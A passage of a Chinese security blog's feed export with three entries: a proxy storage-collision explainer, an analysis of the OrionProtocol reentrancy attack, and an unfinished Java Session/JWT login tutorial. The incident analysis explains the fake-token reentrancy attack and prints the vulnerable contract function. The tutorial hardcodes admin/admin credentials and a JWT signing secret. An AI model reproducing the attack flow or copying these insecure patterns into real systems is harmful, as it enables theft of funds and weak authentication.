&quot;,proxied.get());</span><br></pre></td></tr></table></figure><p>前两步分别创建了逻辑和代理合约。第二步还调用了<code>upgradeTo()</code>，这样代理就知道要使用哪个逻辑合约。第三步需要告诉Solidity编译器，我们现在计划使用代理，就像它是逻辑合约一样。第四步是它变得有趣的地方。我们在代理上调用<code>add()</code>函数。由于代理没有定义任何该名称的函数，其回调函数被执行。在回调函数中，<code>msg.data</code>包含以下调用数据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1003e2d20000000000000000000000000000000000000000000000000000000000000002</span><br></pre></td></tr></table></figure><p>这代表了对一个签名为 “add(uint256)”、参数为2的函数的调用 。然后，回退函数用上述调用数据执行一个 “delegatecall”，使用代理的存储空间执行 “Counter “合约中的 “add() “函数。</p><p>最后，在第五步中，我们试图从代理中获取当前的计数器值。然而，执行<code>proxied.get()</code>实际上是回退了! 这个错误的原因可以通过可视化代理和逻辑合约来轻松解释。</p><p>下面是<code>FaultyProxy</code>和<code>Counter</code>合约的存储结构</p><p><img src="Upgradeable-Contract.assets/foundry_scheme_4.png" alt="Foundry Scheme"></p><p>当比较两个合约的存储布局时，我们可以注意到它们在slot 0中存储了不同的变量。这产生了一个严重的后果。当<code>Counter.add()</code>使用<code>FaultyProxy</code>的存储空间执行时，它覆盖了slot 0，以便更新<code>number</code>。然而，在合约<code>FaultyProxy</code>中，slot 0包含<code>implementation</code>的值。因此，当我们在步骤(4)中调用<code>proxied.add(2)</code>时，我们实际上将存储在<code>implementation</code>中的地址增加了2，使得地址无效。更确切地说，现在产生的地址指向一个账户，而这个账户很可能没有被部署过合约。当对一个空账户进行委托时，调用将成功，但没有数据被返回。然而，由于我们确实希望返回一个<code>uint256</code>类型的值，所以测试被revert。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;区块链的不可更改性与传统的软件开发过程有根本性的冲突，在传统的软件开发过程中，代码被不断地更新以修复</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OrionProtocol攻击分析</title>
    <link href="https://banana69.site/2023/02/05/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://banana69.site/2023/02/05/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
    <published>2023-02-05T15:37:00.000Z</published>
    <updated>2023-02-23T13:45:55.369Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205233801445.png" alt="image-20230205233801445"></p><h3 id="0x01-事件背景"><a href="#0x01-事件背景" class="headerlink" title="0x01 事件背景"></a>0x01 事件背景</h3><p>2023.2.2 Ethereum和Binance链上OrionProtocol因为合约漏洞遭到重入攻击，损失 2844766 USDT （Ethereum）和 191606 BUSD (BSC)，价值约290 万美元。</p><p><strong><strong>Ethereum链过程分析：</strong></strong></p><p>攻击者地址：<code>0x837962b686fd5a407fb4e5f92e8be86a230484bd </code></p><p>攻击合约地址：<code>0x5061f7e6dfc1a867d945d0ec39ea2a33f772380a</code></p><p>攻击交易地址：<code>0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa</code></p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205234624029.png" alt="image-20230205234624029"></p><h3 id="0x02-攻击分析"><a href="#0x02-攻击分析" class="headerlink" title="0x02 攻击分析"></a>0x02 攻击分析</h3><p>攻击者创建<code>Token</code>合约后对该合约进行转移及授权，为后续攻击做准备。</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205235436377.png" alt="image-20230205235436377"></p><p>攻击者通过<strong>UNI-V2.swap</strong>方法借款并调用<code>ExchangeWithAtomic.swapThroughOrionPool</code>方法进行代币兑换，兑换路径为 </p><p><code>path=[USDC, 0x64acd987a8603eeaf1ee8e87addd512908599aec,USDT] </code></p><p>路径中的地址为 Token 合约地址，攻击者使用该合约进行回掉。</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000105038.png" alt="image-20230206000105038"></p><p>由于 <code>Token</code> 合约中存在回掉，所以攻击者通过<code>Token.Transfer</code>继续回调<code>ExchangeWithAtomic.depositAsset</code>进行重入让存款金额累加，随后取款完成获利。<br><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000610272.png" alt="image-20230206000610272"></p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000737042.png" alt="image-20230206000737042"></p><h3 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h3><p>关键问题在<code>PoolFunctionality</code>合约的doSwapThroughOrionPool`函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function doSwapThroughOrionPool(</span><br><span class="line">        address user,</span><br><span class="line">        address to,</span><br><span class="line">        IPoolFunctionality.SwapData calldata swapData</span><br><span class="line">    ) external override returns (uint256 amountOut, uint256 amountIn) &#123;</span><br><span class="line">        bool withFactory = swapData.path.length &gt; 2 &amp;&amp;</span><br><span class="line">            (supportedFactories[swapData.path[0]] != FactoryType.UNSUPPORTED);</span><br><span class="line">        address curFactory = withFactory ? swapData.path[0] : factory;</span><br><span class="line">        address[] memory new_path;</span><br><span class="line"></span><br><span class="line">        uint256 tokenIndex = withFactory ? 1 : 0;</span><br><span class="line">        new_path = new address[](swapData.path.length - tokenIndex);</span><br><span class="line"></span><br><span class="line">        for ((uint256 i, uint256 j) = (tokenIndex, 0); i &lt; swapData.path.length; (++i, ++j)) &#123;</span><br><span class="line">            new_path[j] = swapData.path[i] == address(0) ? WETH : swapData.path[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (uint256 amount_spend_base_units, uint256 amount_receive_base_units) = (</span><br><span class="line">            LibUnitConverter.decimalToBaseUnit(</span><br><span class="line">                swapData.path[tokenIndex],</span><br><span class="line">                swapData.amount_spend</span><br><span class="line">            ),</span><br><span class="line">            LibUnitConverter.decimalToBaseUnit(</span><br><span class="line">                swapData.path[swapData.path.length - 1],</span><br><span class="line">                swapData.amount_receive</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        &#123;</span><br><span class="line">        (uint256 userAmountIn, uint256 userAmountOut) = _doSwapTokens(InternalSwapData(</span><br><span class="line">            user,</span><br><span class="line">            amount_spend_base_units,</span><br><span class="line">            amount_receive_base_units,</span><br><span class="line">            withFactory ? swapData.path[1] : swapData.path[0],</span><br><span class="line">            new_path,</span><br><span class="line">            swapData.is_exact_spend,</span><br><span class="line">            to,</span><br><span class="line">            curFactory,</span><br><span class="line">            supportedFactories[curFactory],</span><br><span class="line">            swapData.supportingFee</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        //  Anyway user gave amounts[0] and received amounts[len-1]</span><br><span class="line">        amountOut = LibUnitConverter.baseUnitToDecimal(</span><br><span class="line">            swapData.path[tokenIndex],</span><br><span class="line">            userAmountIn</span><br><span class="line">        );</span><br><span class="line">        amountIn = LibUnitConverter.baseUnitToDecimal(</span><br><span class="line">            swapData.path[swapData.path.length - 1],</span><br><span class="line">            userAmountOut</span><br><span class="line">        );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后跟进到<code>_doSwapTokens</code>函数</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206001644793.png" alt="image-20230206001644793"></p><p>在转账发生之后更新 curBalance，所以在faketoken的transfer新增一个回调功能，回调代码就是调用depositAsset函数，所以导致curBalance错误更新，然后攻击者在还完闪电贷之后调用withdraw提走资金 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205233801445.png&quot; alt=&quot;image-20230205233801445&quot;&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="区块链安全事件分析" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java 登录认证</title>
    <link href="https://banana69.site/2023/02/04/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/"/>
    <id>https://banana69.site/2023/02/04/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/</id>
    <published>2023-02-04T09:36:53.000Z</published>
    <updated>2023-02-04T13:58:40.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>登录认证，估计是所有系统中最常见的功能了，并且也是最基础、最重要的功能。为了做好这一块而诞生了许多安全框架，比如最常见的Shiro、Spring Security等。</p><p>这篇文章介绍实际项目中如何运用安全框完成登录认证（<strong>「Authentication」</strong>）、权限授权（<strong>「Authorization」</strong>）等功能。</p><h3 id="登录认证的原理"><a href="#登录认证的原理" class="headerlink" title="登录认证的原理"></a>登录认证的原理</h3><p>登录认证（Authentication）的概念非常简单，就是通过一定手段对用户的身份进行确认，即判断用户的账户和密码是否正确。但是在Web系统中<strong>「HTTP请求是一个无状态的协议」</strong>。就是说浏览器每一次发送的请求都是独立的，对于浏览器来说，不会记住上一次的请求，所以在Web系统中确认了用户的身份后，需要某种机制来记住用户是否已经登陆过。</p><p>现在流行两种方式登录认证方式：<strong>「Session」</strong>和<strong>「JWT」</strong>，无论是哪种方式其原理都是Token机制，即保存凭证：</p><ol><li>前端发起登录认证请求</li><li>后端登录验证通过，返回给前端一个<strong>「凭证」</strong></li><li>前端发起新的请求时携带<strong>「凭证」</strong></li></ol><p>搭建一个springboot web项目。</p><p>创建一个实体类模拟用户：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>Session，是一种有状态的会话管理机制，其目的就是为了解决HTTP无状态请求带来的问题。</p><p>当用户登录认证请求通过时，服务端会将用户的信息存储起来，并生成一个<code>Session Id</code>发送给前端，前端将这个<code>Session Id</code>保存起来（一般是保存在Cookie中）。之后前端再发送请求时都携带<code>Session Id</code>，服务器端再根据这个<code>Session Id</code>来检查该用户有没有登录过：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174249136.png" alt="image-20230204174249136"></p><p>我们只需要在用户登录的时候将用户信息保存在<strong>HttpSession</strong>中就可以：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SessionController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;login&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestBody</span> User user, HttpSession session)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(user.getUsername()) &amp;&amp; <span class="string">&quot;admin&quot;</span>.equals(user.getPassword()))&#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登录成功&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;登录失败，账号或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;logout&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">logout</span><span class="params">(HttpSession session)</span></span>&#123;</span><br><span class="line">        session.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;退出成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模拟一个接口，在用户访问web接口时，会首先判断该用户是否登录：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;api&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpSession session)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 模拟各种api，访问之前都要检查有没有登录，没有登录就提示用户登录</span></span><br><span class="line">    User user = (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请先登录&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果有登录就调用业务层执行业务逻辑，然后返回数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未登录时无法调用接口</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174522710.png" alt="image-20230204174522710"></p><p>调用登录接口</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174546218.png" alt="image-20230204174546218"></p><p>当用户成功登录后就可以访问到相应的资源</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174608949.png" alt="image-20230204174608949"></p><p>如果用户第一次访问某个服务器时，服务器响应数据时会在响应头的<code>Set-Cookie</code>标识里将<code>Session Id</code>返回给浏览器，浏览器就将标识中的数据存在<code>Cookie</code>中，浏览器后续访问服务器就会携带Cookie。</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174911929.png" alt="image-20230204174911929"></p><p>每一个<code>Session Id</code>都对应一个<code>HttpSession</code>对象，服务器会根据这个<code>HttpSession</code>对象来检测这个客户端是否已经登录。</p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>除登录接口外，其他接口都需要判断用户是否已经登录，都需要在Controller层里做判断，我们可以对每个接口过滤拦截，判断是否已经登录，如果没有登录就结束请求，若登录了就放行，这些操作都可以通过过滤器来实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFilter</span> <span class="keyword">extends</span> <span class="title">OncePerRequestFilter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//登录这个接口直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;/login&quot;</span>.equals(request.getRequestURI())) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="keyword">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//未登录时访问其他接口</span></span><br><span class="line">        response.sendRedirect(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时Controller层中的接口就不需要写多余的登录判断逻辑了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;api&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="上下文对象"><a href="#上下文对象" class="headerlink" title="上下文对象"></a>上下文对象</h4><p>在有些情况下，就算加了过滤器后我们现在还不能在controller层将session代码去掉！因为在实际业务中对用户对象操作是非常常见的，而我们的业务代码一般都写在Service业务层，那么我们Service层想要操作用户对象还得从Controller那传参过来，就像这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;doSomething&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpSession session)</span> </span>&#123;</span><br><span class="line">    User user = (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="comment">// 将用户对象传递给Service层</span></span><br><span class="line">    userService.doSomething(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过SpringMVC提供的<code>RequestContextHolder</code>对象在程序任何地方获取到当前请求对象，从而获取保存在<code>HttpSession</code>中的用户对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HttpServletRequest <span class="title">getCurrentRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 通过`RequestContextHolder`获取当前request请求对象</span></span><br><span class="line">        <span class="keyword">return</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title">getCurrentUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request对象获取session对象，再获取当前用户对象</span></span><br><span class="line">        <span class="keyword">return</span> (User)getCurrentRequest().getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以在Service层直接调用该方法获取到用户对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = RequestContext.getCurrentUser();</span><br><span class="line">        System.out.println(<span class="string">&quot;service层---当前登录用户对象：&quot;</span> + user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在Controller层调用Service</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;doSomething&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 各种业务操作</span></span><br><span class="line">    userService.doSomething();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;api成功返回数据&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204182048133.png" alt="image-20230204182048133"></p><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>除了<code>Session</code>之外，目前比较流行的做法就是使用<code>JWT</code>（JSON Web Token）。关于 <code>JWT</code> 需要知道两个特性：</p><ol><li>可以将一段数据加密成一段字符串，也可以从这字符串解密回数据；</li><li>可以对这个字符串进行校验，比如有没有过期，有没有被篡改。</li></ol><p>有上面两个特性之后就可以用来做登录认证了。当用户登录成功的时候，服务器生成一个<code>JWT</code>字符串返回给浏览器，浏览器将<code>JWT</code>保存起来，在之后的请求中都携带上<code>JWT</code>，服务器再对这个<code>JWT</code>进行<strong>「校验」</strong>，校验通过的话就代表这个用户登录了。</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204182222295.png" alt="image-20230204182222295"></p><p><code>session</code>与<code>JWT</code>都是基于<strong>TOKEN</strong>机制，但是<code>Session</code>是有状态的，JWT是无状态的。即<code>Session</code>在服务端<strong>「保存了用户信息」</strong>，而<code>JWT</code>在服务端<strong>「没有保存任何信息」</strong>。当前端携带<code>Session Id</code>到服务端时，服务端要检查其对应的<code>HttpSession</code>中有没有保存用户信息，保存了就代表登录了。当使用<code>JWT</code>时，服务端只需要对这个字符串进行校验，校验通过就代表登录了。</p><h4 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h4><p>导入坐标：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>写一个 JWT 的工具类，提供生成和解析两个方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 防止JWT被篡改的密钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String SECRET_KEY = <span class="string">&quot;secretK@y&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Duration EXPIRATION = Duration.ofHours(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成JWT</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userName 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWt</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generate</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        <span class="comment">//过期时间</span></span><br><span class="line">        Date expirDate = <span class="keyword">new</span> Date(System.currentTimeMillis() + EXPIRATION.toMillis());</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setSubject(userName) <span class="comment">//将 userName 放进 JWT</span></span><br><span class="line">                .setIssuedAt(<span class="keyword">new</span> Date()) <span class="comment">//设置JWT签发时间</span></span><br><span class="line">                .setExpiration(expirDate) <span class="comment">//设置过期时间</span></span><br><span class="line">                .signWith(SignatureAlgorithm.HS512,SECRET_KEY) <span class="comment">//设置加密算法和密钥</span></span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析JWT</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parse</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果是空字符串则返回null</span></span><br><span class="line">        <span class="keyword">if</span>(Strings.isEmpty(token))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Claims对象包含了许多属性，比如签发时间、过期时间以及存放的数据等</span></span><br><span class="line">        Claims claims = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 解析失败会抛出异常。token过期、token非法都会导致解析失败</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            claims = Jwts.parser()</span><br><span class="line">                    .setSigningKey(SECRET_KEY)</span><br><span class="line">                    .parseClaimsJws(token)</span><br><span class="line">                    .getBody();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;解析失败！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工具类做好之后我们可以开始写登录接口了，和之前大同小异：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;jwtLogin&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 判断账号密码是否正确</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(user.getUsername()) &amp;&amp; <span class="string">&quot;admin&quot;</span>.equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="comment">// 如果正确的话就返回生成的token（注意哦，这里服务端是没有存储任何东西的）</span></span><br><span class="line">            <span class="keyword">return</span> JwtUtil.generate(user.getUsername());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;登录失败，账号密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后续的会话中，用户访问其他接口时可以校验<code>token</code>来判断是否已经登录。前端将<code>token</code>一般会放在请求头的<code>Authorization</code>项传递过来，其格式一般为<code>类型 + token</code>。</p><p>写一个测试接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;JwtApi&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpServletRequest request)</span></span>&#123;</span><br><span class="line">        <span class="comment">//从请求头中获取token字符串</span></span><br><span class="line">        String jwt = request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="comment">//解析失败则提示用户登录</span></span><br><span class="line">        <span class="keyword">if</span>(JwtUtil.parse(jwt) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;请先登录&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204192602294.png" alt="image-20230204192602294"></p><p>登录后可以获取到token，将这个token设置到请求头中再调用接口：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204192747706.png" alt="image-20230204192747706"></p><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>和 <code>session</code>一样做一个过滤器做统一处理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter(filterName = &quot;loginCheckFilter&quot;,urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginCheckFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="comment">//路径匹配器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> AntPathMatcher PATH_PATTERN = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    <span 